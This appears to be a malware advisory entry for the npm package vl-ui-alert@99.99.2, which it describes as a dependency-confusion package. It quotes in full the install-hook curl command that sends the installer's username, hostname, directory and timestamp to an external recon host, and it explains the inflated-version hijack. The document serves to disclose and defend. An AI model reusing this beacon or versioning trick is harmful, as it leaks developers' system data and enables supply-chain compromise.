details: Dependency-confusion package vl-ui-alert@99.99.2 that beacons host metadata on install. The package contains no functional code (index.js is a single-line comment only). Both preinstall and postinstall hooks execute: curl -s "hxxps://178fx66q[.]instances[.]httpworkbench[.]com/depconf/?pkg=vl-ui-alert&u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)" > /dev/null || true. This exfiltrates the installer's username, hostname, current working directory, and timestamp to an external recon panel at 178fx66q[.]instances[.]httpworkbench[.]com. The /depconf/ path segment suggests the server is collecting dependency-confusion victims. The version is set to 99.99.2 to hijack npm version resolution over any legitimate version of vl-ui-alert.

cwes.name: Inclusion of Functionality from Untrusted Control Sphere
